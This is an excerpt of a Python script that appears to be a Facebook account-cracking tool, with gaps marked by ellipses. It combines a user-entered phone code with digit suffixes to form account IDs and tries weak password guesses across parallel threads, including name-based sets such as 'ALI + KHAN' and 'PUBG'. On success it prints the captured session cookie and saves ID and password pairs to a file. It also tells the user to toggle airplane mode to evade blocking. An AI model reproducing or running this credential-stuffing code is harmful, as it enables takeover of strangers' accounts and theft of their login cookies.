...
[•] \033[1;32m𝙑𝙀𝙍𝙎𝙄𝙊𝙉 10.0\033[1;32m
--------------------------------------------------"""
...
cps = []
try:
    print('\n\033[1;32m[•] ALREADY UPDATED DONE')
...
def menu():
	...
	if opt =='1':
		...
		print('\n\033[1;32m[•] Choose valid option\033[1;32m')
		time.sleep(2)
		menu()
...
def svn_digit():
	...
	lines()
	kode = input('[•]\033[1;32m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print('\033[1;32m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;32m[•] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
		print('\033[1;32m[•] USE FLIGHT AIRPLANE MODE FOR OK IDS')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru]
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;32m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;32m[•] METHOD YOU CHOOSE : \033[1;32mALI + KHAN')
		print('\033[1;32m[•] USE FLIGHT AIRPLANE MODE FOR OK IDS')
		lines()
		for guru in user:
			uid = kode+guru
...
def malik_baloch():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;32m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;32m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
		print('\033[1;32m[•] USE FLIGHT AIRPLANE MODE FOR OK IDS')
		lines()
		for guru in user:
			uid = kode+guru
...
def pubg():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;32m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;32m[•] METHOD YOU CHOOSE : \033[1;32mPUBG')
		print('\033[1;32m[•] USE FLIGHT AIRPLANE MODE FOR OK IDS')
		lines()
		for guru in user:
			uid = kode+guru
...
def ff():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;32m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;32m[•] METHOD YOU CHOOSE : \033[1;32mFREE FIRE')
		print('\033[1;32m[•] USE FLIGHT AIRPLANE MODE FOR OK IDS')
		lines()
		for guru in user:
			uid = kode+guru
...
def bd():
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;32m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;32m[•] METHOD YOU CHOOSE : \033[1;32mBANGLA')
		print('\033[1;32m[•] USE FLIGHT AIRPLANE MODE FOR OK IDS')
		lines()
		for guru in user:
			uid = kode+guru
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SW4TI-OK] '+cid+'|'+ps+'\033[1;32m\n[‎‎🍁]\033[1;32m COOKIE = \033[1;32m'+coki+  '  ''  \033[1;32m')
                ...
                open('AB-KHANX-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;32mAB-KHANX\033[1;32m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
